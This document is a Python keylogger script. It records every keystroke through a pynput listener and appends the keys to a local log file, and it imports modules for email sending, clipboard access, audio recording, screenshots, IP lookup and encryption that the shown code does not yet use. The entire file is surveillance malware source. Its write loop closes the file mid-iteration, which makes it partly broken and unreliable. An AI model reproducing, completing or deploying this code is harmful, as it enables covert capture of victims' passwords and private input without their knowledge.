#Libraries
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info= "basic_key_log.txt"
file_path="C:\\Users\\...." #Pprovide valid path where all files are stored
extend = "\\"

count=0
keys=[]

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count+=1
    if count>=1:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(file_path+extend+keys_info,"a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                f.close()
            elif k.find("Key")==-1:
                f.write(k)
                f.close()

def on_release(key):
    if key== Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()